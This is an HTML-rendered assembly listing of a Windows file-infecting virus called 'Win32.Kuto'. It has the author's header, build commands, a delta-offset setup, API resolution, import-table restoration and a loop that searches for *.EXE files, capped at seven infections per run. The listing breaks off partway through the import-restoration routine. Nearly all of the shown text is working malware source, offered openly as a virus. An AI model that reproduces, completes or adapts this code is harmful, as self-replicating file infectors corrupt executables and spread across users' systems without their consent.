<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>kuto.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">
</span><span class="sc1">;  Virus Name ...: Win32.Kuto</span><span class="sc0">
</span><span class="sc1">;  Author .......: Juan Tamad</span><span class="sc0">
</span><span class="sc1">;  Origin .......: Philippines</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Description...: This is my very first virus. It is a direct action,</span><span class="sc0">
</span><span class="sc1">;                : non-resident, infect files on current dir, and adds</span><span class="sc0">
</span><span class="sc1">;                : a new section. Also, instead of the usual search</span><span class="sc0">
</span><span class="sc1">;                : the base of KERNEL32, it instead carries its own</span><span class="sc0">
</span><span class="sc1">;                : import table and changes the entry of imports in data</span><span class="sc0">
</span><span class="sc1">;                : directory to point to the new import table. It is similar</span><span class="sc0">
</span><span class="sc1">;                : to import method in Win32.Demo by SMT/SMF (DVL #6).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Compile.......: tasm32 -q -t -ml -m3 kuto.asm</span><span class="sc0">
</span><span class="sc1">;                : tlink32 -Tpe -c -x kuto.obj ,,, import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">

        </span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">FLAT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
        </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">
        </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
        </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">

</span><span class="sc5">e_lfanew</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc0">
</span><span class="sc5">NumberOfSections</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_FileHeader.FH_NumberOfSections</span><span class="sc0">
</span><span class="sc5">ImageBase</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_ImageBase</span><span class="sc0">
</span><span class="sc5">AddressOfEntryPoint</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc0">
</span><span class="sc5">SizeOfImage</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_SizeOfImage</span><span class="sc0">
</span><span class="sc5">SectionAlignment</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_SectionAlignment</span><span class="sc0">
</span><span class="sc9">Import</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">NT_OptionalHeader.OH_DataDirectory.DE_Import.\
</span><span class="sc0">                          </span><span class="sc5">DD_VirtualAddress</span><span class="sc0">
</span><span class="sc5">SizeOfRawData</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">SH_SizeOfRawData</span><span class="sc0">
</span><span class="sc5">PointerToRawData</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">SH_PointerToRawData</span><span class="sc0">
</span><span class="sc5">VirtualSize</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">SH_VirtualSize</span><span class="sc0">
</span><span class="sc5">VirtualAddress</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">SH_VirtualAddress</span><span class="sc0">

</span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">ApiName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@10</span><span class="sc0">
        </span><span class="sc9">IRP</span><span class="sc0">     </span><span class="sc5">@0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">@10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc9">IFNB</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">@0</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@0</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc9">EXTERN</span><span class="sc0">  </span><span class="sc5">ApiName</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ApiName</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0">     </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">ApiName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@10</span><span class="sc0">
        </span><span class="sc9">IRP</span><span class="sc0">     </span><span class="sc5">@0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">@10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc9">IFNB</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">@0</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@0</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[&amp;</span><span class="sc5">ApiName</span><span class="sc4">&amp;+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">LoadLibraryA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">   </span><span class="sc5">GetProcAddress</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">d</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">w</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">b</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

        </span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">HostEntry</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleHandleA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">e_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OriginalImportTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VirEntry</span><span class="sc0">

</span><span class="sc5">szMsg1</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"First generation..."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMsg2</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Win32.Kuto"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HostExit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMsg1</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMsg2</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">VIRSIZE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirEntry</span><span class="sc0">
</span><span class="sc5">FILESIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">MAX_INFECT</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">7</span><span class="sc0">

        </span><span class="sc9">.DATA</span><span class="sc0">

</span><span class="sc5">VirEntry</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostExit</span><span class="sc0">
</span><span class="sc5">OriginalEntryPoint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; delta</span><span class="sc0">

        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetModuleHandleA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; ImageBase</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetApiAddress</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreOriginalImports</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szMask</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; '*.EXE'</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wfd</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; WIN32_FIND_DATA</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FindFirstFileA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReturnToHost</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFind</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Infected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">.repeat</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wfd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FindNextFileA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFind</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">.break</span><span class="sc0">
                </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc9">.until</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Infected</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">&gt;=</span><span class="sc0"> </span><span class="sc5">MAX_INFECT</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FindClose@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFind</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">
</span><span class="sc5">GetApiAddress</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szK32</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; 'KERNEL32.DLL'</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetModuleHandleA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@szApi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.repeat</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetProcAddress@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc5">@</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; find end of string</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@</span><span class="sc0">
        </span><span class="sc9">.until</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetApiAddress</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Restore hosts original imports. If LoadLibrary or GetProcAddress</span><span class="sc0">
</span><span class="sc1">; fails, there is no way to return to host (you can return, but it</span><span class="sc0">
</span><span class="sc1">; will most likely crash).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">RestoreOriginalImports</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BADC0DEh</span><span class="sc0">
</span><span class="sc5">OriginalImportTable</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.repeat</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; RVA of dll name</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetModuleHandleA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LoadLibrary@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Terminate</span><span class="sc0">       </span><span class="sc1">; bad...</span><span class="sc0">
                        </span><span class="sc9">.endif</span><span class="sc0">
                </span><span class="sc9">.endif</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; OriginalFirstThunk</span><span class="sc0">
                </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; yes?</span><span class="sc0">
                         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; no, use FirstThunk</span><span class="sc0">
                </span><span class="sc9">.endif</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; IAT</span><span class="sc0">
                </span><span class="sc9">.while</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> !</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc1">; In case IAT is not write enabled</span><span class="sc0">

                        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">VirtualProtect@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">          </span><span class="sc1">; Ordinal?</span><span class="sc0">
                        </span><span class="sc9">.if</span><span class="sc0"> !</span><span class="sc10">zero?</span><span class="sc0">
                                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fffffffh</span><span class="sc0">
                        </span><span class="sc9">.else</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hModule</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc9">.endif</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
